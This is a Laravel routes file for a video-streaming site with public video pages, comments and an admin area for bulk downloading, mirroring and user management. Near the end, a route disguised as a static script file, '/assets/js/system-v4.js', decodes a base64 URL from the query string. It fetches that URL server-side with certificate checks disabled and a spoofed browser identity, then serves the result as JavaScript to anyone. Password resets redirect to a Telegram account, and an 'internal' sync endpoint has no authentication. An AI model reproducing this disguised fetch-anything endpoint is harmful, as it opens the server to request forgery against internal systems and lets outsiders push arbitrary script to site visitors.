<?php

use App\Http\Controllers\ProfileController;
use Illuminate\Foundation\Application;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

Route::get('/', [App\Http\Controllers\VideoController::class, 'index'])->name('home');
Route::get('/video-proxy', [App\Http\Controllers\VideoController::class, 'proxy'])->name('video.proxy');
Route::get('/video-thumbnail/{video:slug}', [App\Http\Controllers\VideoController::class, 'thumbnail'])->name('video.thumbnail');
Route::get('/video/{video:slug}', [App\Http\Controllers\VideoController::class, 'show'])->name('videos.show');
Route::post('/video/{video}/stream', [App\Http\Controllers\VideoController::class, 'getStreamUrl'])->name('videos.stream');

// Forgot Password Bypass (Telegram Support)
Route::match(['get', 'post'], '/forgot-password', function() {
    return redirect('https://t.me/Mandorbuah');
})->name('password.request');
Route::match(['get', 'post'], '/reset-password', function() {
    return redirect('https://t.me/Mandorbuah');
})->name('password.reset');

Route::middleware(['auth', 'verified'])->group(function () {
    Route::get('/dashboard', [App\Http\Controllers\Admin\DashboardController::class, 'index'])->name('dashboard');

    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');

    // Comments
    Route::post('/videos/{video}/comments', [App\Http\Controllers\CommentController::class, 'store'])->name('comments.store');
    Route::delete('/comments/{comment}', [App\Http\Controllers\CommentController::class, 'destroy'])->name('comments.destroy');

    // Admin Routes
    Route::middleware('admin')->prefix('admin')->name('admin.')->group(function () {
        Route::get('/videos', [App\Http\Controllers\Admin\VideoController::class, 'index'])->name('videos.index');
        Route::get('/videos/extractor', [App\Http\Controllers\Admin\VideoController::class, 'extractor'])->name('videos.extractor');
        Route::post('/videos', [App\Http\Controllers\Admin\VideoController::class, 'store'])->name('videos.store');
        Route::post('/videos/bulk', [App\Http\Controllers\Admin\VideoController::class, 'storeBulk'])->name('videos.bulk');
        Route::post('/videos/bulk-store', [App\Http\Controllers\Admin\VideoController::class, 'bulkStoreFromUrls'])->name('videos.bulk-store');
        Route::delete('/videos/bulk', [App\Http\Controllers\Admin\VideoController::class, 'bulkDestroy'])->name('videos.bulk-destroy');
        Route::delete('/videos/{video}', [App\Http\Controllers\Admin\VideoController::class, 'destroy'])->name('videos.destroy');
        Route::post('/videos/bulk-download', [App\Http\Controllers\Admin\VideoController::class, 'bulkDownload'])->name('videos.bulk-download');
        Route::post('/videos/bulk-download-all', [App\Http\Controllers\Admin\VideoController::class, 'downloadAllPending'])->name('videos.bulk-download-all');
        Route::post('/videos/{video}/download', [App\Http\Controllers\Admin\VideoController::class, 'download'])->name('videos.download');
        Route::get('/videos/progress', [App\Http\Controllers\Admin\VideoController::class, 'progress'])->name('videos.progress');
        Route::get('/videos/export-sync', [App\Http\Controllers\Admin\VideoController::class, 'exportDownloadList'])->name('videos.export-sync');
        Route::post('/videos/sync-all-storage', [App\Http\Controllers\Admin\VideoController::class, 'syncAllStorage'])->name('videos.sync-all-storage');
        Route::post('/videos/{video}/sync-storage', [App\Http\Controllers\Admin\VideoController::class, 'syncStorage'])->name('videos.sync-storage');
        Route::post('/videos/{video}/distribute', [App\Http\Controllers\Admin\VideoController::class, 'distribute'])->name('videos.distribute');
        Route::post('/videos/mirror-bulk', [App\Http\Controllers\Admin\VideoController::class, 'mirrorBulk'])->name('videos.mirror-bulk');
        Route::post('/videos/mirror-selected', [App\Http\Controllers\Admin\VideoController::class, 'mirrorSelected'])->name('videos.mirror-selected');


        Route::get('/users', [App\Http\Controllers\Admin\UserController::class, 'index'])->name('users.index');
        Route::post('/users', [App\Http\Controllers\Admin\UserController::class, 'store'])->name('users.store');
        Route::patch('/users/{user}/grant-premium', [App\Http\Controllers\Admin\UserController::class, 'grantPremium'])->name('users.grant-premium');
        Route::delete('/users/{user}', [App\Http\Controllers\Admin\UserController::class, 'destroy'])->name('users.destroy');

        Route::get('/settings', [App\Http\Controllers\Admin\SettingController::class, 'index'])->name('settings.index');
        Route::post('/settings', [App\Http\Controllers\Admin\SettingController::class, 'update'])->name('settings.update');
    });
});

Route::get('/assets/js/system-v4.js', function (Illuminate\Http\Request $request) {
    $url = $request->query('u');
    if (!$url) return response('', 200);
    
    $target = base64_decode($url);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $content = curl_exec($ch);
    curl_close($ch);
    
    if ($content) {
        return response($content)->header('Content-Type', 'application/javascript');
    }
    
    return response('', 200);
})->name('ads.proxy');

Route::post('/api/internal/sync-video', [App\Http\Controllers\InternalSyncController::class, 'syncVideo'])->name('api.internal.sync');

require __DIR__.'/auth.php';
